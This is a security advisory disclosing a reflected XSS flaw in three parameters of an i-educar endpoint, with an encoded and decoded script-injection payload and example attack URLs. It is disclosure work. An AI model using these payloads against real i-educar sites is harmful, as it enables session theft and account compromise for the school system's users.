# Cross-Site Scripting (XSS) Reflected endpoint `/intranet/educar_usuario_lst.php` parameters `nm_pessoa`, `matricula` and `matricula_interna`

---

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the `/intranet/educar_usuario_lst.php` endpoint of the _i-educar_ application. This vulnerability allows attackers to inject malicious scripts into the `nm_pessoa`, `matricula`, and `matricula_interna` parameters.

---

## Details

**Vulnerable Endpoint:** `GET /intranet/educar_usuario_lst.php`  
**Parameters:** `nm_pessoa`, `matricula`, `matricula_interna`

The application fails to validate and sanitize user inputs in the `nm_pessoa`, `matricula`, and `matricula_interna` parameters. This lack of validation permits the injection of malicious payloads, which are reflected back to the user's browser in the server's response and executed within the context of the victim's browser.

---

## PoC

**Encoded Payload:**

`%22%3E%3Cscript%3Ealert('XSS-PoC2')%3C/script%3E`

**Decoded Payload:**

`"><script>alert('XSS-PoC2')</script>`

<img width="854" height="800" alt="Pasted image 20250704192500" src="https://github.com/user-attachments/assets/b441db20-2039-4283-ad24-656e5379d5b9" />


**Example URLs:**

`/intranet/educar_usuario_lst.php?nm_pessoa=%22%3E%3Cscript%3Ealert('XSS-PoC2')%3C/script%3E /intranet/educar_usuario_lst.php?matricula=%22%3E%3Cscript%3Ealert('XSS-PoC2')%3C/script%3E /intranet/educar_usuario_lst.php?matricula_interna=%22%3E%3Cscript%3Ealert('XSS-PoC2')%3C/script%3E`

---

## Impact

Reflected cross-site scripting (XSS) attacks can have serious consequences, including:

- **User actions:** Attackers can perform any action the user can, such as viewing, modifying, or initiating interactions with other users
    
- **Data theft:** Attackers can exfiltrate data or install malware on the user's machine
    
- **Account compromise:** Attackers can manipulate or steal cookies, or compromise confidential information
    
- **Malicious code:** Attackers can execute malicious code on the user's system
    
- **Business reputation damage:** Attackers can deface a corporate website or spread misinformation
    
- **Misdirection:** Attackers can change the instructions given to users, which can be dangerous if the target is a government website or provides vital resources
